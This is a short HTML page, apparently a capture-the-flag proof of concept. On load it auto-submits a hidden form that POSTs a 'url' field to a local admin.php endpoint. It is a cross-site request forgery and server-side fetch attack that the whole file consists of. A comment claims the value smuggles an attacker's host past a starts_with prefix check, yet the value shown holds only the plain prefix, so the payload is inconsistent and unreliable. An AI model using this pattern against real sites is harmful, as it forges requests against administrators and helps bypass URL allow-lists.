<!doctype html>
<meta charset="utf-8">
<title>ctf poc</title>
<form id="f" method="post" action="http://localhost:5000/admin.php">
  <!-- Prefix-smuggled URL: passes starts_with("http://localhost:5000/admin.php") but actually fetches YOUR host -->
  <input type="hidden" name="url" value="http://localhost:5000/admin.php">
</form>
<script>
  // Fire the POST immediately
  document.getElementById('f').submit();
</script>
